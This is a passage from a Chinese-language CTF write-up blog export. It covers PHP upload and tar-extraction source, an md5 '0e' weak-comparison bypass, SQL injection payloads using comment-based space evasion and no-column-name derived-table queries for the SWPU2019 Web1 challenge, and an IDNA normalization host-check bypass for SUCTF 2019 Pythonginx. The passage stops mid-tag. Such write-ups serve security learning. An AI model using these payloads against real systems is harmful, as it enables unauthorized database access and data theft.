class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">        <span class="variable">$fileext</span> = substr(strrchr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array(<span class="variable">$fileext</span>,<span class="variable">$type</span>) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="variable">$filename</span>=addslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                    <span class="variable">$id</span>=<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: index.php?id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select filename from img where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="variable">$filename</span>=<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable">$img</span>=<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$img</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">        <span class="variable">$fileext</span> = substr(strrchr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array(<span class="variable">$fileext</span>,<span class="variable">$type</span>) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$filename</span>=addslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">            @exec(<span class="string">&quot;cd /tmp&amp;&amp;python3 /tar.py &quot;</span>.escapeshellarg(<span class="string">&#x27;/var/www/html/&#x27;</span>.<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同理读出tar.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">tar = tarfile.<span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tar.extractall()</span><br></pre></td></tr></table></figure><h3 id="web4-ezmd5"><a href="#web4-ezmd5" class="headerlink" title="web4-ezmd5"></a>web4-ezmd5</h3><p>这题就考fuzz，真挺懵的</p><p>泄露源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line"><span class="variable">$result</span> = @auth(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$username</span>) == md5(<span class="variable">$result</span>)  <span class="keyword">and</span> <span class="variable">$result</span> !== <span class="variable">$username</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bingo : &lt;b&gt;<span class="subst">$flag</span>&lt;/b&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>md5()弱相等通过md5后0e值轻松绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br></pre></td></tr></table></figure><p>然后疯狂fuzz password 发现加32位任意字符就能绕过@auth，就离谱这题</p><blockquote><p>name:s155964671a<br>password:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbQNKCDZO </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SWPU2019]Web1</title>
      <link href="2020/10/19/SWPU2019-Web1/"/>
      <url>2020/10/19/SWPU2019-Web1/</url>
      
        <content type="html"><![CDATA[<p>从ctf中的一道sql注入题学习无列名注入以及派生表的利用</p><span id="more"></span><h3 id="0x01-信息收集，漏洞点探测"><a href="#0x01-信息收集，漏洞点探测" class="headerlink" title="0x01  信息收集，漏洞点探测"></a>0x01  信息收集，漏洞点探测</h3><p><img src="/2020/10/19/SWPU2019-Web1/1603077705125.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603077705125.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603077705125"></p><p>登入框可以注册，注册试试</p><p><img src="/2020/10/19/SWPU2019-Web1/1603077774740.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603077774740.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603077774740"></p><p>发布广告，测试xss</p><p><img src="/2020/10/19/SWPU2019-Web1/1603077948782.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603077948782.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603077948782"></p><p>xss测试成功</p><p><img src="/2020/10/19/SWPU2019-Web1/1603077969287.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603077969287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603077969287"></p><p>然而这个题并不是xss，因为xss本身是被动的攻击，但是并没有管理员来审核</p><p>发现可以查看广告详情测试，猜测二次注入</p><p><img src="/2020/10/19/SWPU2019-Web1/1603078202080.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078202080.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078202080"></p><p><img src="/2020/10/19/SWPU2019-Web1/1603078214431.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078214431.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078214431"></p><p>有sql语法错误回显，确定存在SQL注入</p><h3 id="0x02-注入利用"><a href="#0x02-注入利用" class="headerlink" title="0x02 注入利用"></a>0x02 注入利用</h3><p><img src="/2020/10/19/SWPU2019-Web1/1603078375160.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078375160.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078375160">经过测试发现其会过滤掉空格，使用/**/多行注释符进行绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p>测试order by被ban，只能通过手工union select 测试有几列，竟然有22列（此处想打出题人）</p><p><img src="/2020/10/19/SWPU2019-Web1/1603078602919.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078602919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078602919"></p><p>回显点为 2,3 从而</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/19/SWPU2019-Web1/1603078668752.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078668752.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078668752"></p><p>继续注入，发现一但出现information_schema字段<img src="/2020/10/19/SWPU2019-Web1/1603078886033.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603078886033.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603078886033">被ban</p><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p> 在mysql5.7增加了sys  系统数据库，通过这个库可以快速的了解系统的元数据信息这个库确实可以方便DBA发现数据库的很多信息，解决性能瓶颈都提供了巨大帮助，简单来说，当数据库版本是5.7，information_schema库被过滤时，可以利用sys这个库来读取数据 </p><p><strong>sys.schema_table_statistics</strong></p><p> <strong>sys.schema_auto_increment_columns</strong>  </p><p> 同时在mysql数据库下<img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212640240-1882833743.png" class="lazyload" data-srcset="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212640240-1882833743.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p><p> <img src="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212521529-1650453614.png" class="lazyload" data-srcset="https://img2018.cnblogs.com/blog/1625650/202001/1625650-20200129212521529-1650453614.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p><p>以上方式参考自<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">https://www.cnblogs.com/wangtanzhi/p/12241499.html</a></p><p>在本题中就可以用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/19/SWPU2019-Web1/1603085286670.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603085286670.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603085286670"></p><p>从而得到所有的表名</p><h4 id="派生表利用"><a href="#派生表利用" class="headerlink" title="派生表利用"></a>派生表利用</h4><p><img src="/2020/10/19/SWPU2019-Web1/1603085351150.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603085351150.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603085351150"></p><p><img src="/2020/10/19/SWPU2019-Web1/1603085365513.png" class="lazyload" data-srcset="/2020/10/19/SWPU2019-Web1/1603085365513.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1603085365513"></p><p>在本地的一个数据库进行测试，结果如图所示</p><p>我们可以通过派生表的方法在只知道表名的情况下通过*全匹配生成派生表构造列名读取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p>从而拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> sql注入派生表利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SUCTF 2019]Pythonginx</title>
      <link href="2020/10/10/SUCTF-2019-Pythonginx/"/>
      <url>2020/10/10/SUCTF-2019-Pythonginx/</url>
      
        <content type="html"><![CDATA[<p>刷题刷题，这个题考点是nginx和一个blackhat上的议题，本来不难，也能猜到大概是爆破的思路，可就是没弄成，最后还是参考的大师傅们的博客，我太菜了</p><span id="more"></span><h3 id="0x01-blackhat议题"><a href="#0x01-blackhat议题" class="headerlink" title="0x01 blackhat议题"></a>0x01 blackhat议题</h3><p> <img src="https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113142549010-1977431520.png" class="lazyload" data-srcset="https://img2018.cnblogs.com/i-beta/1828215/202001/1828215-20200113142549010-1977431520.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">black hat 黑帽大会议题 ppt</a></p><h3 id="0x02-nginx-基础"><a href="#0x02-nginx-基础" class="headerlink" title="0x02  nginx 基础"></a>0x02  nginx 基础</h3><p>nginx常用来做反向代理服务器</p><blockquote><p> 配置文件存放目录：/etc/nginx<br> 主配置文件：/etc/nginx/conf/nginx.conf<br> 管理脚本：/usr/lib64/systemd/system/nginx.service<br> 模块：/usr/lisb64/nginx/modules<br> 应用程序：/usr/sbin/nginx<br> 程序默认存放位置：/usr/share/nginx/html<br> 日志默认存放位置：/var/log/nginx<br> 配置文件目录为：/usr/local/nginx/conf/nginx.conf </p></blockquote><h3 id="0x03-源码分析"><a href="#0x03-源码分析" class="headerlink" title="0x03 源码分析"></a>0x03 源码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>这个源代码是python的flask框架，很明显是绕过前两个if 进入最后一个if 并且实现文件包含</p><h4 id="urlparse-urlsplit-urlunsplit"><a href="#urlparse-urlsplit-urlunsplit" class="headerlink" title="urlparse urlsplit urlunsplit"></a>urlparse urlsplit urlunsplit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlparse, urlunsplit</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(urlsplit(url))</span><br><span class="line"><span class="built_in">print</span>(urlsplit(url).hostname)</span><br><span class="line"><span class="built_in">print</span>(urlparse(url))</span><br><span class="line">parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line"><span class="built_in">print</span>(urlunsplit(parts))</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">SplitResult(scheme=&#x27;https&#x27;, netloc=&#x27;username:password@www.baidu.com:80&#x27;, path=&#x27;/index.html;parameters&#x27;, query=&#x27;name=tom&#x27;, fragment=&#x27;example&#x27;)</span></span><br><span class="line"><span class="string">www.baidu.com</span></span><br><span class="line"><span class="string">ParseResult(scheme=&#x27;https&#x27;, netloc=&#x27;username:password@www.baidu.com:80&#x27;, path=&#x27;/index.html&#x27;, params=&#x27;parameters&#x27;, query=&#x27;name=tom&#x27;, </span></span><br><span class="line"><span class="string">fragment=&#x27;example&#x27;)</span></span><br><span class="line"><span class="string">https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>看blackhat对应议题结合源码分析，很明显就是在url处构造一个经过<code>encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code>编码后为suctf.cc/u的字符串，然后读取nginx的配置文件</p><h3 id="0x04-爆破出合适的字符串"><a href="#0x04-爆破出合适的字符串" class="headerlink" title="0x04 爆破出合适的字符串"></a>0x04 爆破出合适的字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> res==<span class="string">&#x27;c/u&#x27;</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/10/SUCTF-2019-Pythonginx/1602399072117.png" class="lazyload" 